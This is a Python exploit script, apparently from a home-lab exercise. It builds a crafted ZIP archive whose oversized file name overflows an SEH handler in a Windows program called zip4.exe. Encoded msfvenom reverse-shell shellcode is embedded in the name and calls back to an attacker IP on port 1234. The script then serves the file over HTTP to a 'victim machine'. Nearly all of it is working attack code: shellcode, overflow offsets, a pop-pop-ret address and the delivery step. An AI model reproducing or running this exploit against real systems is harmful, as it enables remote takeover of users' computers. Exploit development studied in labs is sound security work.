#!/usr/bin/python3

import struct
import socketserver
import subprocess
import http.server


def create_file(offset):
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.255.130 LPORT=1234 -f python -b "\x00\x2f\x3a\x5c" -e x86/alpha_mixed BufferRegister=EAX
    buf =  b""
    buf += b"\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
    buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
    buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
    buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
    buf += b"\x6b\x4c\x59\x78\x6e\x62\x73\x30\x47\x70\x53\x30\x61"
    buf += b"\x70\x6e\x69\x5a\x45\x30\x31\x4b\x70\x63\x54\x6c\x4b"
    buf += b"\x42\x70\x46\x50\x6e\x6b\x42\x72\x54\x4c\x4e\x6b\x71"
    buf += b"\x42\x44\x54\x4c\x4b\x63\x42\x35\x78\x54\x4f\x4f\x47"
    buf += b"\x71\x5a\x71\x36\x65\x61\x6b\x4f\x6e\x4c\x57\x4c\x33"
    buf += b"\x51\x43\x4c\x75\x52\x44\x6c\x35\x70\x39\x51\x5a\x6f"
    buf += b"\x74\x4d\x77\x71\x38\x47\x6a\x42\x58\x72\x62\x72\x43"
    buf += b"\x67\x6e\x6b\x61\x42\x72\x30\x4c\x4b\x42\x6a\x35\x6c"
    buf += b"\x6c\x4b\x50\x4c\x74\x51\x54\x38\x4d\x33\x72\x68\x53"
    buf += b"\x31\x7a\x71\x43\x61\x4e\x6b\x33\x69\x67\x50\x35\x51"
    buf += b"\x5a\x73\x4e\x6b\x42\x69\x32\x38\x69\x73\x56\x5a\x57"
    buf += b"\x39\x6c\x4b\x50\x34\x6e\x6b\x75\x51\x7a\x76\x54\x71"
    buf += b"\x39\x6f\x6c\x6c\x59\x51\x7a\x6f\x34\x4d\x67\x71\x7a"
    buf += b"\x67\x54\x78\x39\x70\x33\x45\x5a\x56\x74\x43\x73\x4d"
    buf += b"\x39\x68\x47\x4b\x33\x4d\x65\x74\x64\x35\x4b\x54\x52"
    buf += b"\x78\x6e\x6b\x53\x68\x56\x44\x65\x51\x58\x53\x73\x56"
    buf += b"\x4e\x6b\x36\x6c\x50\x4b\x4e\x6b\x31\x48\x37\x6c\x65"
    buf += b"\x51\x5a\x73\x4e\x6b\x45\x54\x4c\x4b\x43\x31\x6e\x30"
    buf += b"\x6e\x69\x71\x54\x57\x54\x55\x74\x33\x6b\x53\x6b\x31"
    buf += b"\x71\x63\x69\x53\x6a\x66\x31\x59\x6f\x69\x70\x43\x6f"
    buf += b"\x73\x6f\x61\x4a\x4c\x4b\x77\x62\x6a\x4b\x6c\x4d\x63"
    buf += b"\x6d\x72\x48\x67\x43\x65\x62\x73\x30\x73\x30\x52\x48"
    buf += b"\x43\x47\x53\x43\x37\x42\x63\x6f\x36\x34\x63\x58\x50"
    buf += b"\x4c\x62\x57\x56\x46\x34\x47\x59\x6f\x7a\x75\x4e\x58"
    buf += b"\x6c\x50\x33\x31\x77\x70\x55\x50\x51\x39\x59\x54\x32"
    buf += b"\x74\x76\x30\x62\x48\x77\x59\x6d\x50\x32\x4b\x63\x30"
    buf += b"\x59\x6f\x4a\x75\x66\x30\x32\x70\x56\x30\x66\x30\x77"
    buf += b"\x30\x30\x50\x53\x70\x76\x30\x35\x38\x48\x6a\x66\x6f"
    buf += b"\x6b\x6f\x39\x70\x4b\x4f\x69\x45\x6a\x37\x43\x5a\x37"
    buf += b"\x75\x50\x68\x69\x50\x49\x38\x6b\x4f\x6d\x52\x61\x78"
    buf += b"\x55\x52\x63\x30\x53\x34\x4b\x62\x4b\x39\x58\x66\x61"
    buf += b"\x7a\x34\x50\x53\x66\x56\x37\x30\x68\x5a\x39\x4e\x45"
    buf += b"\x53\x44\x61\x71\x79\x6f\x7a\x75\x6e\x65\x4b\x70\x64"
    buf += b"\x34\x46\x6c\x79\x6f\x50\x4e\x37\x78\x70\x75\x7a\x4c"
    buf += b"\x53\x58\x68\x70\x4f\x45\x79\x32\x63\x66\x6b\x4f\x78"
    buf += b"\x55\x75\x38\x71\x73\x30\x6d\x61\x74\x43\x30\x6b\x39"
    buf += b"\x49\x73\x30\x57\x33\x67\x56\x37\x50\x31\x38\x76\x72"
    buf += b"\x4a\x75\x42\x52\x79\x32\x76\x68\x62\x49\x6d\x51\x76"
    buf += b"\x69\x57\x43\x74\x36\x44\x55\x6c\x35\x51\x67\x71\x6c"
    buf += b"\x4d\x52\x64\x61\x34\x44\x50\x6a\x66\x75\x50\x77\x34"
    buf += b"\x52\x74\x32\x70\x31\x46\x32\x76\x51\x46\x30\x46\x32"
    buf += b"\x76\x70\x4e\x42\x76\x42\x76\x42\x73\x53\x66\x43\x58"
    buf += b"\x30\x79\x5a\x6c\x67\x4f\x6d\x56\x69\x6f\x69\x45\x4e"
    buf += b"\x69\x6b\x50\x52\x6e\x36\x36\x33\x76\x69\x6f\x50\x30"
    buf += b"\x32\x48\x45\x58\x4e\x67\x67\x6d\x45\x30\x6b\x4f\x79"
    buf += b"\x45\x4d\x6b\x78\x70\x6d\x65\x4d\x72\x76\x36\x72\x48"
    buf += b"\x4f\x56\x6d\x45\x6d\x6d\x4f\x6d\x39\x6f\x6b\x65\x35"
    buf += b"\x6c\x34\x46\x63\x4c\x74\x4a\x4d\x50\x69\x6b\x79\x70"
    buf += b"\x34\x35\x43\x35\x4d\x6b\x47\x37\x74\x53\x54\x32\x32"
    buf += b"\x4f\x50\x6a\x57\x70\x72\x73\x39\x6f\x48\x55\x41\x41"
    # push ESP onto the stack, pop into EAX, sub EAX down to shellcode location and JMP to EAX
    jmpback = b"\x54\x58\x2d\x7f\x7f\x7f\x7f\x2d\x70\x70\x7f\x7f\x2d\x0d\x0a\x01\x01\x98\x85"
    # pop pop ret located at 0x00451845 in zip4.exe
    seh = struct.pack("<I", 0x00451845)
    # \x41\x77\x83\x41 tranlsates to \x41\x77\xe2\x41 in the application, see zip_char_translator.py
    nseh = b"\x41\x77\x83\x41"
    # NULL bytes appear in the buffer, they end at 266 bytes in
    filename = b"A"*266 + buf + b"A"*(offset - 266 - len(buf) - len(jmpback)) + jmpback + nseh + seh + b"D"*(4000 - offset - 8)
    filename = filename.strip() + b".txt"
    local_file_header = b"\x50\x4b\x03\x04" # Local File signature
    local_file_header += b"\x14\x00" # minimum version needed to extract
    local_file_header += b"\x00\x00" # General purpose bit flag
    local_file_header += b"\x00\x00" # Compression method
    local_file_header += b"\xb7\xac" # File last modification time
    local_file_header += b"\xce\x34" # File last modification date
    local_file_header += b"\x00\x00\x00\x00" # CRC-32
    local_file_header += b"\x00\x00\x00\x00" # Compressed size
    local_file_header += b"\x00\x00\x00\x00" # Uncompressed size
    local_file_header += b"\x00\x0f" # File name length
    local_file_header += b"\x00\x00" # Extra field length
    local_file_header += filename # File name
    local_file_header += b"" # Extra field

    data = ""
    # data_descriptor is only used when the CRC isn't known when the file is generated
    data_descriptor = b"\x50\x4b\x07\x08" # Optional data descriptor signature
    data_descriptor += b"\x00\x00\x00\x00" # CRC-32
    data_descriptor += b"\x00\x00\x00\x00" # Compressed size
    data_descriptor += b"\x00\x00\x00\x00" # Uncompressed size
    
    central_file_directory_header = b"\x50\x4b\x01\x02" # Central directory file header signature
    central_file_directory_header += b"\x14\x00" # version made by
    central_file_directory_header += b"\x14\x00" # minimum version needed to extract
    central_file_directory_header += b"\x00\x00" # general purpose bit flag
    central_file_directory_header += b"\x00\x00" # Compression method
    central_file_directory_header += b"\xb7\xac" # File last modification time
    central_file_directory_header += b"\xce\x34" # File last modification date
    central_file_directory_header += b"\x00\x00\x00\x00" # CRC-32
    central_file_directory_header += b"\x00\x00\x00\x00" # Compressed size
    central_file_directory_header += b"\x00\x00\x00\x00" # Uncompressed size
    central_file_directory_header += b"\x00\x0f" # File name length
    central_file_directory_header += b"\x00\x00" # Extra field length
    central_file_directory_header += b"\x00\x00" # File comment length
    central_file_directory_header += b"\x00\x00" # Disk number where file starts
    central_file_directory_header += b"\x00\x00" # Internal file attributes
    central_file_directory_header += b"\x00\x00\x00\x00" # External file attributes
    central_file_directory_header += b"\x00\x00\x00\x00" # Relative offset of local file header
    central_file_directory_header += filename # File name
    central_file_directory_header += b"" # Extra field
    central_file_directory_header += b"" # File comment
    
    # eocd = end of central directory record
    eocd = b"\x50\x4b\x05\x06" # eocd signature
    eocd += b"\x00\x00" # number of this disk
    eocd += b"\x00\x00" # disk where central directory starts
    eocd += b"\x01\x00" # Number of central directory records on this disk
    eocd += b"\x01\x00" # total number of central directory records
    eocd += b"\x12\x10\x00\x00" # Size of central directory
    eocd += b"\x02\x10\x00\x00" # Offset of start of central directory relative to start of archive
    eocd += b"\x00\x00" # Comment length
    eocd += b"" # Comment

    attack = local_file_header + central_file_directory_header + eocd

    file = open("test1.zip", "wb")
    file.write(attack)
    file.close()

def serve_directory():
    # I did this all on my linux box and served it up to my Windows victim machine
    # a normal person would probably just run this onthe windows machine without the http server
    port = 8000 
    ip = "192.168.255.130"
    httpServer = socketserver.TCPServer((ip, port), http.server.SimpleHTTPRequestHandler)
    print("[+] Starting HTTP Server on " + ip + " port " + str(port))
    httpServer.serve_forever()

def main():
    offset = 1022
    create_file(offset)
    serve_directory()

if __name__ == "__main__":
    main()
